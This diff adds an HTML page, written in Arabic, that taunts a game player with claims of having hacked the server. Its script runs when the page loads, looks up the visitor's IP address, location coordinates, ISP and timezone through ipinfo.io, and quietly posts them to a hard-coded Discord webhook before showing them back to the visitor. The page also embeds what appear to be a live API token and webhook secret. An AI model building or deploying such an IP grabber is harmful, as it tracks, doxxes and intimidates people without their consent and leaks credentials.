@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <style>
+
+        * {
+            color: white;
+            background-color: black;
+        }
+        h1 {
+            color: aliceblue;
+            text-align: center;
+        }
+        p {
+            color: aliceblue;
+            text-align: center;
+        }
+
+
+    #ip-info-container {
+    box-shadow: 0 0 15px rgba(255, 255, 255, 0.625);
+    background-color: black;
+    border-radius: 10px;
+    padding: 20px;
+    width: 29%;
+    color: rgb(255, 255, 255);
+    text-align: center;
+    z-index: 3;
+    position: absolute;
+    bottom: 55;
+    left: 52%;
+    transform: translateX(-50%);
+    
+}
+    </style>
+</head>
+<body>
+    <h1>بندتو عمكم صقر؟</h1>
+    <p>بعيوني صقر & ناصر & سوفت</p>
+    <canvas id="matrixCanvas"></canvas>
+    <div id="ip-info-container">
+        <div class="info-container">
+            <div id="info-header" class="yj" style="display: inline-block;">معلوماتك عزيزي الاعب</div>
+            <p>للمعلومية" جبنا معلوماتك بعد ماهركنا خادم السيرفر"</p>
+            <img src="assest/see.png" alt="Info Icon" width="90">
+        </div>
+        <pre id="ip-info">Loading...</pre>
+
+        <script>
+            document.addEventListener("DOMContentLoaded", function() {
+    fetch('https://ipinfo.io/json?token=e3cfa029e73f36') // استبدل YOUR_TOKEN_HERE بالتوكن الخاص بك
+        .then(response => response.json())
+        .then(data => {
+            const info = {
+                ip: data.ip,
+                city: data.city,
+                region: data.region,
+                country: data.country,
+                loc: data.loc,  // هذا يحتوي على إحداثيات الموقع
+                org: data.org,
+                timezone: data.timezone
+            };
+
+            // إرسال البيانات إلى ديسكورد باستخدام Webhook
+            const webhookURL = "https://discord.com/api/webhooks/1355416163001303132/IMdZWGAzQ_WKi_FAUdMfksBgmmyBIvYJuvaG_4CiPneqNxWrPPDR9SEgMHxRY4dYKdIG"; // استبدل برابط الـ Webhook الخاص بك
+
+            const message = {
+                content: `معلومات المستخدم:
+
+- **IP**: ${info.ip}
+- **المدينة**: ${info.city}
+- **المنطقة**: ${info.region}
+- **الدولة**: ${info.country}
+- **الإحداثيات**: ${info.loc}
+- **المنظمة**: ${info.org}
+- **المنطقة الزمنية**: ${info.timezone}
+\`\`\` \`\`\``
+
+            };
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(message)
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log("Msg Done Send");
+                } else {
+                    console.log("Error Msg.");
+                }
+            })
+            .catch(error => {
+                console.log("Eror Discord Webhook", error);
+            });
+
+            // عرض البيانات في الصفحة بدون الأقواس وبنمط مرتب
+            document.getElementById('ip-info').innerText = `
+IP: ${info.ip}
+City: ${info.city}
+Region: ${info.region}
+Country: ${info.country}
+Coordinates: ${info.loc}
+Organization: ${info.org}
+Timezone: ${info.timezone}
+            `;
+        })
+        .catch(error => {
+            document.getElementById('ip-info').innerText = 'Erorr Call M7md';
+        });
+});
+        </script>
+</body>
+</html>
